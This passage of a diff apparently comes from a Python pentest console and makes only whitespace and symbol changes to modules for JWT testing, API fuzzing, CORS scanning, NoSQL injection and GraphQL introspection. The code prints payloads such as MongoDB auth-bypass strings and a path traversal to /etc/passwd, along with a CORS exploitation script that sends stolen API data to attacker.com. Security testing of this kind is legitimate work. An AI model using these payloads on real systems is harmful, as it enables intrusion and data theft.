-        print(f"{Fore.CYAN}║          JWT SECURITY TESTER                     ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ JWT SECURITY TESTER ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         if not token:
             print(f"{Fore.YELLOW}No token provided. Showing test scenarios:{Style.RESET_ALL}\n")
             
             print(f"{Fore.GREEN}1. None Algorithm Attack:{Style.RESET_ALL}")
-            print(f"   Change 'alg' to 'none' and remove signature")
-            print(f"   {Fore.CYAN}{{\"alg\":\"none\",\"typ\":\"JWT\"}}{Style.RESET_ALL}\n")
+            print(f" Change 'alg' to 'none' and remove signature")
+            print(f" {Fore.CYAN}{{\"alg\":\"none\",\"typ\":\"JWT\"}}{Style.RESET_ALL}\n")
             
             print(f"{Fore.GREEN}2. Algorithm Confusion (RS256 → HS256):{Style.RESET_ALL}")
-            print(f"   Sign with public key using HS256")
-            print(f"   Server may verify with public key as secret\n")
+            print(f" Sign with public key using HS256")
+            print(f" Server may verify with public key as secret\n")
             
             print(f"{Fore.GREEN}3. Weak Secret Brute Force:{Style.RESET_ALL}")
-            print(f"   Try common secrets from wordlist\n")
+            print(f" Try common secrets from wordlist\n")
             
             print(f"{Fore.GREEN}4. JWT Payload Manipulation:{Style.RESET_ALL}")
-            print(f"   Modify claims: user_id, role, permissions\n")
+            print(f" Modify claims: user_id, role, permissions\n")
             
             print(f"{Fore.BLUE}Example token structure:{Style.RESET_ALL}")
             print(f"{Fore.CYAN}eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{Style.RESET_ALL}")
@@ -19932,9 +19932,9 @@ ENTER
             print(f"{Fore.GREEN}SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c{Style.RESET_ALL}\n")
             
             print(f"{Fore.BLUE}Tools:{Style.RESET_ALL}")
-            print(f"  • jwt_tool - https://github.com/ticarpi/jwt_tool")
-            print(f"  • jwt.io - Online decoder")
-            print(f"  • hashcat - JWT cracking")
+            print(f" • jwt_tool - https://github.com/ticarpi/jwt_tool")
+            print(f" • jwt.io - Online decoder")
+            print(f" • hashcat - JWT cracking")
         else:
             print(f"{Fore.YELLOW}Token: {Fore.WHITE}{token[:50]}...{Style.RESET_ALL}\n")
             
@@ -19947,13 +19947,13 @@ ENTER
                     header = base64.b64decode(parts[0] + '==').decode('utf-8')
                     payload = base64.b64decode(parts[1] + '==').decode('utf-8')
                     
-                    print(f"{Fore.GREEN}✓ JWT decoded:{Style.RESET_ALL}\n")
+                    print(f"{Fore.GREEN} JWT decoded:{Style.RESET_ALL}\n")
                     print(f"{Fore.CYAN}Header:{Style.RESET_ALL}")
                     print(f"{header}\n")
                     print(f"{Fore.CYAN}Payload:{Style.RESET_ALL}")
                     print(f"{payload}\n")
             except:
-                print(f"{Fore.RED}✗ Invalid JWT format{Style.RESET_ALL}\n")
+                print(f"{Fore.RED} Invalid JWT format{Style.RESET_ALL}\n")
     
     def run_api_fuzzer(self):
         """REST API fuzzer"""
@@ -19962,7 +19962,7 @@ ENTER
         endpoints_file = self.module_options.get('endpoints', 'endpoints.txt')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          REST API FUZZER                         ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ REST API FUZZER ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Target: {Fore.WHITE}{url}{Style.RESET_ALL}")
@@ -19987,22 +19987,22 @@ ENTER
         ]
         
         for endpoint in endpoints:
-            print(f"  {Fore.CYAN}{endpoint}{Style.RESET_ALL}")
+            print(f" {Fore.CYAN}{endpoint}{Style.RESET_ALL}")
         
         print(f"\n{Fore.BLUE}Fuzzing techniques:{Style.RESET_ALL}")
-        print(f"  • HTTP method fuzzing (GET, POST, PUT, DELETE, PATCH, OPTIONS)")
-        print(f"  • Path traversal (../../../etc/passwd)")
-        print(f"  • SQL injection in parameters")
-        print(f"  • XXE in XML/JSON")
-        print(f"  • Authentication bypass")
-        print(f"  • Rate limiting tests")
-        print(f"  • IDOR vulnerabilities\n")
+        print(f" • HTTP method fuzzing (GET, POST, PUT, DELETE, PATCH, OPTIONS)")
+        print(f" • Path traversal (../../../etc/passwd)")
+        print(f" • SQL injection in parameters")
+        print(f" • XXE in XML/JSON")
+        print(f" • Authentication bypass")
+        print(f" • Rate limiting tests")
+        print(f" • IDOR vulnerabilities\n")
         
-        print(f"{Fore.GREEN}ℹ  Tools:{Style.RESET_ALL}")
-        print(f"  • ffuf - Fast web fuzzer")
-        print(f"  • wfuzz - Web application fuzzer")
-        print(f"  • Burp Suite Intruder")
-        print(f"  • OWASP ZAP")
+        print(f"{Fore.GREEN}ℹ Tools:{Style.RESET_ALL}")
+        print(f" • ffuf - Fast web fuzzer")
+        print(f" • wfuzz - Web application fuzzer")
+        print(f" • Burp Suite Intruder")
+        print(f" • OWASP ZAP")
     
     def run_cors_scanner(self):
         """CORS misconfiguration scanner"""
@@ -20010,7 +20010,7 @@ ENTER
         origin = self.module_options.get('origin', 'https://evil.com')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          CORS SCANNER                            ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ CORS SCANNER ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Target: {Fore.WHITE}{url}{Style.RESET_ALL}")
@@ -20030,32 +20030,32 @@ ENTER
             acac = response.headers.get('Access-Control-Allow-Credentials')
             
             if acao:
-                print(f"{Fore.GREEN}✓ CORS headers present{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} CORS headers present{Style.RESET_ALL}")
                 print(f"{Fore.CYAN}Access-Control-Allow-Origin: {Fore.WHITE}{acao}{Style.RESET_ALL}")
                 if acac:
                     print(f"{Fore.CYAN}Access-Control-Allow-Credentials: {Fore.WHITE}{acac}{Style.RESET_ALL}\n")
                 
                 if acao == '*':
-                    print(f"{Fore.YELLOW}⚠  Wildcard CORS - allows all origins!{Style.RESET_ALL}")
+                    print(f"{Fore.YELLOW} Wildcard CORS - allows all origins!{Style.RESET_ALL}")
                 elif acao == origin:
-                    print(f"{Fore.RED}⚠  Origin reflected - potential vulnerability!{Style.RESET_ALL}")
+                    print(f"{Fore.RED} Origin reflected - potential vulnerability!{Style.RESET_ALL}")
                     if acac == 'true':
-                        print(f"{Fore.RED}⚠  Credentials allowed with reflected origin - CRITICAL!{Style.RESET_ALL}")
+                        print(f"{Fore.RED} Credentials allowed with reflected origin - CRITICAL!{Style.RESET_ALL}")
                 else:
-                    print(f"{Fore.GREEN}✓ CORS properly configured{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN} CORS properly configured{Style.RESET_ALL}")
             else:
-                print(f"{Fore.BLUE}ℹ  No CORS headers found{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ No CORS headers found{Style.RESET_ALL}")
                 
         except Exception as e:
-            print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED} Error: {str(e)}{Style.RESET_ALL}")
         
         print(f"\n{Fore.BLUE}Exploitation scenario:{Style.RESET_ALL}")
         print(f"{Fore.CYAN}<!-- evil.com -->")
         print(f"<script>")
         print(f"fetch('{url}/api/sensitive', {{")
-        print(f"  credentials: 'include'")
+        print(f" credentials: 'include'")
         print(f"}}).then(r => r.json())")
-        print(f"  .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))")
+        print(f" .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))")
         print(f"</script>{Style.RESET_ALL}")
     
     def run_nosql_injection(self):
@@ -20065,7 +20065,7 @@ ENTER
         technique = self.module_options.get('technique', 'auth_bypass')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          NoSQL INJECTION TESTER                  ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ NoSQL INJECTION TESTER ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Target: {Fore.WHITE}{url}{Style.RESET_ALL}")
@@ -20075,30 +20075,30 @@ ENTER
         print(f"{Fore.GREEN}Common NoSQL injection payloads:{Style.RESET_ALL}\n")
         
         print(f"{Fore.CYAN}1. Authentication Bypass (MongoDB):{Style.RESET_ALL}")
-        print(f"   {Fore.WHITE}username[$ne]=null&password[$ne]=null")
-        print(f"   username[$gt]=&password[$gt]=")
-        print(f"   username=admin&password[$ne]=1{Style.RESET_ALL}\n")
+        print(f" {Fore.WHITE}username[$ne]=null&password[$ne]=null")
+        print(f" username[$gt]=&password[$gt]=")
+        print(f" username=admin&password[$ne]=1{Style.RESET_ALL}\n")
         
         print(f"{Fore.CYAN}2. JavaScript Injection:{Style.RESET_ALL}")
-        print(f"   {Fore.WHITE}username=admin&password=x' || '1'=='1")
-        print(f"   username='; return true; var dummy='&password=pass{Style.RESET_ALL}\n")
+        print(f" {Fore.WHITE}username=admin&password=x' || '1'=='1")
+        print(f" username='; return true; var dummy='&password=pass{Style.RESET_ALL}\n")
         
         print(f"{Fore.CYAN}3. Blind NoSQL Injection:{Style.RESET_ALL}")
-        print(f"   {Fore.WHITE}username[$regex]=^a.*&password[$ne]=1")
-        print(f"   # Test each character of password{Style.RESET_ALL}\n")
+        print(f" {Fore.WHITE}username[$regex]=^a.*&password[$ne]=1")
+        print(f" # Test each character of password{Style.RESET_ALL}\n")
         
         print(f"{Fore.CYAN}4. Array Injection:{Style.RESET_ALL}")
-        print(f"   {Fore.WHITE}username[]=admin&username[]=administrator")
-        print(f"   # May bypass length validation{Style.RESET_ALL}\n")
+        print(f" {Fore.WHITE}username[]=admin&username[]=administrator")
+        print(f" # May bypass length validation{Style.RESET_ALL}\n")
         
         print(f"{Fore.BLUE}MongoDB operators to test:{Style.RESET_ALL}")
         ops = ["$ne", "$gt", "$gte", "$lt", "$lte", "$in", "$nin", "$regex", "$where", "$exists"]
-        print(f"   {', '.join(ops)}\n")
+        print(f" {', '.join(ops)}\n")
         
-        print(f"{Fore.GREEN}ℹ  Tools:{Style.RESET_ALL}")
-        print(f"  • NoSQLMap - Automated NoSQL scanner")
-        print(f"  • Burp Suite + NoSQLi extensions")
-        print(f"  • Manual testing with Burp Repeater")
+        print(f"{Fore.GREEN}ℹ Tools:{Style.RESET_ALL}")
+        print(f" • NoSQLMap - Automated NoSQL scanner")
+        print(f" • Burp Suite + NoSQLi extensions")
+        print(f" • Manual testing with Burp Repeater")
     
     def run_graphql_introspection(self):
         """GraphQL schema introspection"""
@@ -20106,7 +20106,7 @@ ENTER
         output = self.module_options.get('output', 'schema.json')
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║          GraphQL INTROSPECTION                   ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ GraphQL INTROSPECTION ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
         print(f"{Fore.YELLOW}Endpoint: {Fore.WHITE}{url}{Style.RESET_ALL}\n")
@@ -20149,7 +20149,7 @@ ENTER
                 with open(output, 'w') as f:
                     json.dump(data, f, indent=2)
                 
-                print(f"{Fore.GREEN}✓ Schema retrieved!{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} Schema retrieved!{Style.RESET_ALL}")
                 print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
                 
                 if 'data' in data and '__schema' in data['data']:
@@ -20158,25 +20158,25 @@ ENTER
                     
                     print(f"{Fore.GREEN}Sample types:{Style.RESET_ALL}")
                     for t in types[:5]:
-                        print(f"  • {Fore.CYAN}{t['name']}{Style.RESET_ALL}")
+                        print(f" • {Fore.CYAN}{t['name']}{Style.RESET_ALL}")
                         
             else:
-                print(f"{Fore.RED}✗ Introspection may be disabled{Style.RESET_ALL}")
+                print(f"{Fore.RED} Introspection may be disabled{Style.RESET_ALL}")
                 print(f"{Fore.YELLOW}Status: {response.status_code}{Style.RESET_ALL}")
                 
         except Exception as e:
-            print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED} Error: {str(e)}{Style.RESET_ALL}")
         
         print(f"\n{Fore.BLUE}Common GraphQL attacks:{Style.RESET_ALL}")
-        print(f"  • Introspection (schema disclosure)")
-        print(f"  • Nested queries (DoS)")
-        print(f"  • Batch attacks")
-        print(f"  • Field suggestion abuse")
-        print(f"  • Authorization bypass")
-        print(f"\n{Fore.GREEN}ℹ  Tools:{Style.RESET_ALL}")
-        print(f"  • GraphQL Voyager - Visualize schema")
-        print(f"  • Altair - GraphQL client")
-        print(f"  • InQL Scanner - Burp extension")
+        print(f" • Introspection (schema disclosure)")
+        print(f" • Nested queries (DoS)")
+        print(f" • Batch attacks")
+        print(f" • Field suggestion abuse")
+        print(f" • Authorization bypass")
+        print(f"\n{Fore.GREEN}ℹ Tools:{Style.RESET_ALL}")
+        print(f" • GraphQL Voyager - Visualize schema")
+        print(f" • Altair - GraphQL client")
+        print(f" • InQL Scanner - Burp extension")
     
     def run_evidence_collector(self):
         """Collect evidence and screenshots"""
@@ -20237,7 +20237,7 @@ ENTER
                 "Connection Mesh",
                 [
                     f"active channels :: {self.connection_pool.get_active_count()} / {self.connection_pool.max_connections}",
-                    f"reserve slots   :: {max(0, self.connection_pool.max_connections - self.connection_pool.get_active_count())}"
+                    f"reserve slots :: {max(0, self.connection_pool.max_connections - self.connection_pool.get_active_count())}"
                 ]
             ),
             (
@@ -20261,7 +20261,7 @@ ENTER
             f"inventory :: {total_modules} modules / {len(self.modules)} domains"
         ]
         if self.current_module:
-            module_lines.append(f"engaged   :: {self.current_module}")
+            module_lines.append(f"engaged :: {self.current_module}")
         blocks.append(("Module Matrix", module_lines))
 
         for title, lines in blocks:
@@ -20420,8 +20420,8 @@ ENTER
                     self.show_sessions()
                 
                 else:
-                    print(f"{Fore.RED}✗ Unknown command: {Fore.WHITE}{command}{Style.RESET_ALL}")
-                    print(f"{Fore.BLUE}ℹ  Type {Fore.CYAN}help{Fore.BLUE} for available commands{Style.RESET_ALL}")
+                    print(f"{Fore.RED} Unknown command: {Fore.WHITE}{command}{Style.RESET_ALL}")
+                    print(f"{Fore.BLUE}ℹ Type {Fore.CYAN}help{Fore.BLUE} for available commands{Style.RESET_ALL}")
             
             except KeyboardInterrupt:
                 print(f"\n{Fore.YELLOW}[!] Command interrupted{Style.RESET_ALL}")
